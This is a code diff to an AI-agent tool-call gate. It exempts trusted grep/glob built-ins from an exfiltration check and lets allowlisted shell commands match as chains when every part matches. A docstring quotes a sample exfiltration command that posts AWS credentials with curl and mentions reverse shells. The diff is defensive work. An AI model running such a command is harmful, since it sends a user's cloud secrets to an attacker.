@@ -24,6 +24,7 @@ from typing import TYPE_CHECKING, Any
 if TYPE_CHECKING:
     from kiro_crew.hooks import (
         _GATE_TIER_KINDS,
+        _HOST_SEARCH_BUILTIN_TOOLS,
         _READ_ONLY_TOOL_KINDS,
         KIRO_TOOL_ALIASES,
         GateRule,
@@ -615,7 +616,19 @@ def _rule_exfil(facts: GateFacts, target: str) -> str | None:
     dashboard count): auditing alone leaves a hijacked agent free to ``curl -d
     @~/.aws/credentials evil`` or open a reverse shell. Denied at the gate --
     against the raw command too, not just the title.
+
+    A host-trusted ``grep`` / ``glob`` built-in with no command line runs no shell,
+    so its only judged text is its title, the text it searches for: not read here.
     """
+    call = facts.call
+    if (
+        call.identity_trusted
+        and not call.mcp_server
+        and call.mcp_tool in _HOST_SEARCH_BUILTIN_TOOLS
+        and not call.command
+        and not facts.raw_shell_commands
+    ):
+        return None
     return audit_bash_exfiltration(target, enabled_ids=facts.enabled_ids)
 
 
@@ -1224,9 +1237,9 @@ def _spec_command_granted(call: ToolCall, names: tuple[str, ...]) -> bool:
     """Whether a spec's ``toolsSettings.shell.allowedCommands`` grants this call.
 
     Only a shell call (kiro-cli's ``execute_bash`` among its names) with its
-    command recovered by the host and plain
-    (:func:`kiro_crew.platform.allowed_commands.plain_command`), that one of ``spec_granted_commands``
-    matches whole, as kiro-cli anchors each entry at both ends. Each entry is read
+    command recovered by the host and plain, or a chain of plain commands, each of
+    which one of ``spec_granted_commands`` matches whole
+    (:func:`_command_matches_any`), as kiro-cli anchors each entry at both ends. Each entry is read
     by :mod:`kiro_crew.platform.allowed_commands`, which accepts only the syntax
     both engines read alike and matches it in linear time; any other grants nothing.
     """
@@ -1248,16 +1261,15 @@ def _spec_command_composed(call: ToolCall, names: tuple[str, ...], patterns: Seq
 
 def _command_matches_any(command: str | None, patterns: Sequence[str]) -> bool:
     """Whether *command* is plain
-    (:func:`kiro_crew.platform.allowed_commands.plain_command`: no chaining, pipe,
-    redirect or substitution character anywhere, no ``( ) { }`` outside a quoted
-    argument) and one of *patterns*, each read by
-    :mod:`kiro_crew.platform.allowed_commands`, matches it whole. ``None`` (no
-    recovered command) matches nothing."""
+    (:func:`kiro_crew.platform.allowed_commands.plain_command`: no redirect or
+    substitution character anywhere, no ``( ) { }`` outside a quoted argument), or
+    a chain of plain commands joined by ``&&``, ``||``, ``;`` or ``|``
+    (:func:`kiro_crew.platform.allowed_commands.chain_commands`), and one of
+    *patterns*, each read by :mod:`kiro_crew.platform.allowed_commands`, matches
+    EVERY command of it whole. ``None`` (no recovered command) matches nothing."""
     from kiro_crew.platform import allowed_commands
 
-    if not isinstance(command, str) or not allowed_commands.plain_command(command):
-        return False
-    return allowed_commands.matches_any(tuple(patterns), command)
+    return allowed_commands.chain_matches_all(tuple(patterns), command)
 
 
 def _tier_spec_shell_allowlist(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
@@ -1273,8 +1285,8 @@ def _tier_spec_shell_allowlist(facts: GateFacts, tier: GateTier) -> ToolHookResu
     claude sub-agent's the parent's), and this row
     refuses a shell call (kiro-cli's ``execute_bash`` among its names, no MCP
     server behind it) unless its recovered command passes the same match the
-    ``spec-builtin-grant`` row grants by (:func:`_spec_command_granted`: plain,
-    one pattern matching whole, :func:`_command_matches_any`). A deny, so it holds on every approval policy,
+    ``spec-builtin-grant`` row grants by (:func:`_spec_command_granted`: plain, or
+    a chain whose every command one pattern matches whole, :func:`_command_matches_any`). A deny, so it holds on every approval policy,
     ``AUTO_APPROVE`` included, and whatever grant row would follow.
 
     A ``deny_policy``: the refusal is the spec's state, not a defect in the call,
@@ -1291,8 +1303,10 @@ def _tier_spec_shell_allowlist(facts: GateFacts, tier: GateTier) -> ToolHookResu
     if _spec_command_composed(call, ("execute_bash",), allowlist):
         return ToolHookResult.deny_policy(
             "Blocked by this agent's spec: toolsSettings.execute_bash.denyByDefault is set "
-            "and this command matches allowedCommands, but commands with |, >, <, &&, ;, $() "
-            "or backticks never match. Run the script alone, or move the pipeline into the script."
+            "and this command matches allowedCommands, but a chain (&&, ||, ;, |) matches only "
+            "when every command in it does and it holds no quote, backslash, non-ASCII "
+            "character or --%, and >, <, $() or backticks never match. "
+            "Run the script alone, or move the pipeline into the script."
         )
     return ToolHookResult.deny_policy(
         "Blocked by this agent's spec: toolsSettings.execute_bash.denyByDefault is set "
